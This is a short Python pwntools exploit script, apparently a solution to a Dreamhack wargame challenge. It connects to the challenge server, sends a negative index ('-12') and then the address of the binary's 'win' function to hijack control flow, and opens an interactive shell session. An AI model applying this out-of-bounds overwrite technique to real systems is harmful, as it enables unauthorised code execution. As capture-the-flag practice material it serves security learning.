#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./prob',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 20318)

p.sendline(b'-12')
input()
p.sendline(str(int(exe.sym.win)))



p.interactive()
